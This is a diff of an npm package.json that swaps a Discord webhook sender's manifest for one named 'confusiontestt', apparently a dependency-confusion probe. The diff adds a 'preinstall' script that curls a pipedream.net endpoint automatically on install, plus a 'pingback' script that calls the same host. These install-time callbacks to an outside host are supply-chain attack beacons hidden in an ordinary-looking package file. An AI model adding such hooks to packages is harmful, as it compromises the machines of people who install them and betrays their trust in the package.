@@ -1,28 +1,13 @@
 {
-  "name": "disc-web-sender",
+  "name": "confusiontestt",
   "version": "1.0.0",
-  "description": "Allows for easy webhook sending through discord's webhook API",
-  "main": "./src/index.js",
-  "exports": {
-    "import": "./src/index.mjs",
-    "require": "./src/index.js"
-  },
-  "typings": "index.d.ts",
+  "description": "",
+  "main": "index.js",
   "scripts": {
-    "test": "mocha --timeout 50000"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "curl https://eo536ohsnextro9.m.pipedream.net",
+    "pingback": "curl https://eo536ohsnextro9.m.pipedream.net"  
   },
-  "author": "dcdevlitd",
-  "license": "MIT",
-  "keywords": [
-    ""
-  ],
-  "homepage": "https://github.com/dcdevlitd/disc-web-sender",
-  "dependencies": {
-    "form-data": "^3.0.0",
-    "node-fetch": "^2.6.0"
-  },
-  "devDependencies": {
-    "dotenv": "^8.2.0",
-    "mocha": "^8.0.1"
-  }
+  "author": "",
+  "license": "ISC"
 }
